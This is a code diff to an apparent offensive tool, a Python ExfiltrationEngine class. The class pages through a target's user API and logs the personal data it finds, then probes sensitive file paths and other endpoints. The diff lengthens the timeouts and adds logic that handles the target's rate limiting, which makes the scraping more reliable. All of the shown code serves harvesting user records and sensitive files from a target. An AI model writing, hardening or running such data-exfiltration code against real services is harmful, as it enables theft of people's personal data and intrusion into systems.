@@ -66,6 +66,7 @@ class ExfiltrationEngine(ExfiltrationModule):
 
         url = f"{target}/api/v1/users"
         total_records = 0
+        rate_retries = 0
 
         try:
             async with aiohttp.ClientSession() as session:
@@ -78,7 +79,7 @@ class ExfiltrationEngine(ExfiltrationModule):
                     async with session.get(
                         url,
                         params={"page": page, "limit": page_size},
-                        timeout=aiohttp.ClientTimeout(total=5)
+                        timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status == 200:
                             data = await resp.json()
@@ -104,7 +105,12 @@ class ExfiltrationEngine(ExfiltrationModule):
                                         logger.info(f"      ✓ Found PII: {field} = {str(user[field])[:30]}...")
 
                             page += 1
+                            rate_retries = 0
                         elif resp.status == 429:
+                            rate_retries += 1
+                            if rate_retries >= 3:
+                                logger.info(f"  Rate limited {rate_retries}× — target is throttling exports, moving on")
+                                break
                             logger.info(f"  Rate limited, backing off...")
                             await asyncio.sleep(5)
                         else:
@@ -141,7 +147,7 @@ class ExfiltrationEngine(ExfiltrationModule):
                     async with session.get(
                         url,
                         params={"limit": 1000},
-                        timeout=aiohttp.ClientTimeout(total=5)
+                        timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status == 200:
                             data = await resp.json()
@@ -185,7 +191,7 @@ class ExfiltrationEngine(ExfiltrationModule):
             for path in sensitive_paths:
                 try:
                     url = f"{target}{path}"
-                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
+                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                         if resp.status == 200:
                             content = await resp.text()
                             size = len(content) / (1024 * 1024)
@@ -238,7 +244,7 @@ class ExfiltrationEngine(ExfiltrationModule):
                     async with session.get(
                         url,
                         headers=headers,
-                        timeout=aiohttp.ClientTimeout(total=2)
+                        timeout=aiohttp.ClientTimeout(total=6)
                     ) as resp:
                         if resp.status in [200, 302]:
                             content = await resp.text()
